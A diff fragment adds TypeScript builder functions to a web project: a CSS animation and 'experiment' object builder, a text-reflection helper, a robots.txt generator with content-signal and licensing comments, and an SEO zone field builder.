+    walk.every((face, at) => walkOf(face) === at) &&
+    genesis.nodes.every((node) => walkOf(node.face) < faces.faces) &&
+    hz === 432 &&
+    hop === seated &&
+    experiments.every((row) => row.holds)
+  return {
+    kind: 'css' as const,
+    framework: 'qpu' as const,
+    hz,
+    css: engine,
+    experiments,
+    animate,
+    keyframes,
+    slots: genesis.card,
+    fused: { bytes: fusedBytes, keyframes, cover },
+    naive: { bytes: naiveBytes, keyframes: cover, cover },
+    winner: 'fused' as const,
+    lattice: { walk, phase: '--walk' as const, ticks: faces.faces },
+    imagine: {
+      kind: 'imagination' as const,
+      text: imagine,
+      face: seated,
+      hop,
+      involution: hop === seated,
+      experiment: quantumRows[seated]?.name,
+      holds: hop === seated,
+  },
+    holds,
+  }
+}
+
+/**
+ * Reflect a caller's text onto a face and its involution hop, with the stylesheet slots it occupies.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuReflectHolds
+ */
+export const qpuReflectOf = (imagine = '') => {
+  const text = typeof imagine === 'string' ? imagine : ''
+  const css = qpuCssOf(text)
+  const faces = qpuFacesOf()
+  const face = text.length > n - n ? faceOf(text, faces.faces) : n - n
+  const hop = (face + faces.rays + faces.rays) % faces.faces
+    const seated = css.experiments.find((row) => row.face === face && row.quantum)
+  const again = qpuCssOf(text)
+  const holds =
+    css.holds &&
+    hop === face &&
+    css.imagine.face === face &&
+    css.imagine.hop === hop &&
+    again.imagine.face === face &&
+    (text.length === n - n || seated?.imagine === true)
+  return {
+    kind: 'reflect' as const,
+    imagine: text,
+    face,
+    hop,
+    involution: hop === face,
+    experiment: seated?.name,
+    quantum: seated?.quantum === true,
+    hz: css.hz,
+    css: css.css,
+    slots: css.slots,
+    experiments: css.experiments,
+    genesis: qpuGenesisOf(),
+    holds,
+  }
+}
+
+/**
+ * robots.txt for one first-party host — the zone's content-signal policy, and the one sitemap that host serves.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuRobotsHolds
+ */
+export const qpuRobotsOf = (host: string = unit.host): string => {
+  const h = qpuZoneHostOf(host)
+  if (!h) return `User-agent: *\nDisallow: /\n`
+  return [
+    `# ${h.host} — ${h.serves}`,
+    `#`,
+    `# AI AGENTS ARE WELCOME. The MCP endpoint for this whole zone is ${unit.origin}/mcp, described without a`,
+    `# round-trip at ${unit.origin}/.well-known/mcp.json and as OpenAPI at ${unit.origin}/openapi.json.`,
+    `# Every answer carries its own content address, so a reader can recompute it rather than trust it.`,
+    `#`,
+    `# Content signals: search and ai-input are granted. ai-train is not — the content is CC BY-NC-ND 4.0`,
+    `# (https://${qpuZoneOf().zone}/license), and training a model on it makes a derivative.`,
+    ``,
+    `User-agent: *`,
+    `Content-Signal: search=yes,ai-input=yes,ai-train=no`,
+    `Allow: /`,
+    ``,
+    `Sitemap: ${h.origin}/sitemap.xml`,
+    ``,
+  ].join('\n')
+}
+
+/**
+ * SEO zone fields for each host: robots, sitemap and the zone's reserved labels.
+ * @wing presentation
+ * @kind builder
+ * @evidence qpuSeoZoneHolds
+ */
+export const qpuSeoZoneOf = onceOf(() => {
+  const fields = seoZoneFieldsOf()
+  return { ...fields, holds: qpuSeoZoneHolds(fields) }
+})
